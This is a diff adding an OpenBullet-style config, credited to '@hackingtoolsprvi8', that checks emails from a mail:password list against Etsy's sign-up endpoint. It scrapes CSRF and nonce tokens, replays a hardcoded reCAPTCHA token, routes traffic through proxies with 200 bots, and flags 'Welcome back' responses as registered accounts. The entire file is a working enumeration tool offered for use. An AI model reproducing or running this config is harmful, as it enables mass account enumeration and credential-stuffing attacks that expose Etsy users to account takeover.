@@ -1,0 +1,104 @@
+[SETTINGS]
+{
+  "Name": "Etsy VM(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-05-19T12:02:58.8910863+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://m.etsy.com/sell?ref=ftr" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1" 
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "origin: https://www.etsy.com" 
+  HEADER "referer: https://m.etsy.com/sell?ref=ftr" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36" 
+  HEADER "x-csrf-token: <1>" 
+  HEADER "x-detected-locale: USD|en-US|VN" 
+  HEADER "x-page-guid: ec1da6e8ec3.3e8d2a66d27d25b5392b.00" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+#1 PARSE "<SOURCE>" LR "<meta name=\"csrf_nonce\" content=\"" "\"" -> VAR "1" 
+
+#NNC PARSE "<SOURCE>" LR "name=\"_nnc\" value=\"" "\"" EncodeOutput=TRUE -> VAR "NNC" 
+
+#USE PARSE "<USER>" LR "" "" EncodeOutput=TRUE -> VAR "USE" 
+
+REQUEST POST "https://m.etsy.com/api/v3/ajax/bespoke/member/neu/specs/Join_Neu_Controller" 
+  CONTENT "log_performance_metrics=false&stats_sample_rate=&specs%5BJoin_Neu_Controller%5D%5B%5D=Join_Neu_ApiSpec_Page&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bform_action%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bsubmit_attempt%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bwith_action_context%5D=false&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bview_type%5D=overlay&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bshould_use_new_password_skin%5D=false&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bshow_social_sign_in%5D=false&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bfrom_page%5D=https%3A%2F%2Fwww.etsy.com%2Fsell%3Fref%3Dftr&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bfrom_action%5D=create-shop&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bworkflow_identifier%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bworkflow_type%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Binitial_state%5D=email-first&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bpersistent%5D=true&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5B_nnc%5D=<NNC>&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bemail%5D=<USE>&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bfirst_name%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bpassword%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Benterprise_recaptcha_token%5D=03AGdBq26YtOu1E_SDE6Dl3fIOSVpb2zMLwQnIN1yleHaw51bir9hPFD6vKXrF-o0W-6VvhBIPPr929muMsw4lLtA0S6Mb-CDK3PWn2SVhn9p7FE5A4aHtfT5bgIwWYWTSRnxdWh6kXaY444jSdO_Ce6-M8QxNL5HV3Pn3sFIijlt4njc5DxASLairEf-4ayRt1w6yiV7rYUE0Ng3_W5EAmNMwY3AD6cin1lJ1Dep8joObHeOMjKHegunlgXKFcdqeoJg2L2B08_waolZ9pMXTHekDGAGLLNgjWIa5CNol8kAWDr39EyNc2h8fdgiwIF35E4cw6p5EaQ7mD_yjU5XMidl4f1XQ9chcKqbusCNynOa44LyhVB9IJkLgeEBJ4KZdzQ3G9Y-epMuGxtRYwQYc1hIFRqHP5_FLQR0JSCNYPoTwexz1Kdg93ywAcJUPiYpvqVZvgGcQlB9poOXmyz9X3ERFMvr-JftrCtCGyaaLhRstSHCsN03q1gSk2g3bEx46rzzjD39VRbdFpXTGNii2pHONrffq-tRHY48dpg-8ODfHQkyYG7FWu_aj05tbsOeCbx_DQvbccpnkCyNmaO9gSDVTMzyXCZ-m5-G9NZUd-wMKYtd21Sp-9UHk74N4hYf09-YeMzVdJdfxR1MOwEnlrOs6LifCAAlXoRnSnaG6uKQmI8wDaaHW4Ot8_-h9SmdbUqFoTft_6eWtPsig-3k8YPL9--gcTKthqpKWXYUmmU0k__g7lmiMzd4NxC3dndystzFSbs2oaMdRvcrGo6S2oCmqW2PROw8hd-OUhFQSY3xiQ8FNUVIMf3utgefBegn-stCiUswnjIDBS9ijOLOOuLf89f2CjrkGpAe9p0kByDSDCRa_pnbGwS3crcoHj3EpHFrJwMuw3zU1kgKuHNUumg5YgCmxFTTR5gXk-kaHZuku8ODJmuEeCFIAUwmeg1vh-BYiyoMi5Ni7USmsXZw1b5oZvhr6zvhelHjqAmhEgdidiQnTSWbmDKbfnwzjIJir6nj4zW_52xcZdPV-7x5uI22OUsmeDdYJJvafsexSCKTFxDduS8KtQNEACRoXtYBAljejDTRfwj7S8XsBdhlPp9-LjHYoIwlkr5dea_6xrmI4FBTfkVnlJwiPJkposZsrSYhCMuYgA54LkU19LFHcr2I09wkbFxC9Zn9Nxz64H-f1wcc3RMlW4ugg3fo81QRMZFUqlHTqthzymiiH7wJAFCGC9w1fd05SlHTlIkGDr5-ygiYIDyjHHxHZMQwGNxidwEeljJQO8ZQmVw3FqLSELVdRmPA0eHWryR6ZNoHxaS1pPW26eqcqaT_HzKzUoX9HPWLa2qpL4z7q&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Benterprise_recaptcha_token_key_type%5D=score&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bgoogle_user_id%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bgoogle_code%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bfacebook_user_id%5D=&specs%5BJoin_Neu_Controller%5D%5B1%5D%5Bstate%5D%5Bfacebook_access_token%5D=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1" 
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "origin: https://www.etsy.com" 
+  HEADER "referer: https://m.etsy.com/sell?ref=ftr" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "x-csrf-token: <1>" 
+  HEADER "x-detected-locale: USD|en-US|US" 
+  HEADER "x-page-guid: ec1da6e8ec3.3e8d2a66d27d25b5392b.00" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Welcome back" 
+  KEYCHAIN Custom "CUSTOM" AND 
+    KEY "<SOURCE>" DoesNotContain "Welcome back" 
+    KEY "Use a different email address" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
